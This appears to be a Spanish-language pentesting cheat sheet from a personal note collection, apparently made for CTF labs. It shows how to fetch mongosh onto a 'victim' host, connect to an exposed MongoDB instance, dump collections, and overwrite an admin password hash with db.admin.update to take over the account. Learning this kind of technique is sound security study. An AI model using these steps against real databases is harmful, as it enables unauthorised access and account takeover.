#mogodb

--------

MongoDB es una base de datos NoSQL orientada a documentos que guarda la información en formato similar a JSON (BSON).  
Es flexible, escalable y muy usada para aplicaciones web modernas y datos no estructurados.
Normalmente corre por el puerto 27017

# Como instalar el ejecutable en caso de que no este en la maquina victima
Esto nos va a dejar en la carpeta bin, un binario ejecutable que se llama .mongosh
```shell
curl -O https://downloads.mongodb.com/compass/mongosh-2.3.2-linux-x64.tgz
tar xvf mongosh-2.3.2-linux-x64.tgz
cd mongosh-2.3.2-linux-x64/bin
```

------
# Como conectarse a la base de datos con el ejectuable

```shell
./mongosh mongodb://Ip:Puerto
Ejemplo: ./mongosh mongodb://10.129.228.30:27017
```
*Parametros*
`./mongosh` Es el nombre del ejecutable
`Ip` Ip de la victima
`Puerto` Puerto de la victima

--------
# Si la maquina ya tiene mongodb solamente hay que usar

```
mongo --port 27117
```
![[Unified8.png]]
En este caso estaba usando el puerto 27117, pero podemos ver cual puerto es con [[ps faux y ps -eo]] `ps aux | grep mongod`

![[Unified7.png]]


-------
# Como visualizar contenido de archivos

`show dbs` Es para visualizar todas las bases de datos
`use NombreBaseDeDatos` Seleccionamos la base de datos que queremos usar
`show collections` Es como una tabla en sql que tiene documentos
`db.NombreDelArchivo.find().pretty()` Esto sirve para visualizar el contenido del archivo que queremos ver
`db.admin.find()` Se ven los datos de la tabla admin que puede contenter contraseñas **`admin` no es una colección por defecto**, sino una base de datos especial que contiene usuarios y configuraciones administrativas.
``db.admin.update`` Sirve para cambiar un dato de la tabla admin. En este ejemplo estamos cambiando la contraseña  que esta en SHA-512: |     db.admin.update({"_id":ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"$6$sP2utyIhNX7e0kit$4ysm601QjS5IGZ50Ccru1AcaZ.BdiK96RBSyIweWoLewf7PY7Pf1cfyZbB7GjH5XUIUJFHJyU2UPcCDS3lDnU."}})


Ejemplo de una intrusion real
```mongodb
show dbs
use sensitive_information
show colletions
db.flag.find().pretty()
```

![[Mongod4.png]]

-------
# Notas

Mongodb se llama la base de datos pero mongod es el demonio corriendo el proceso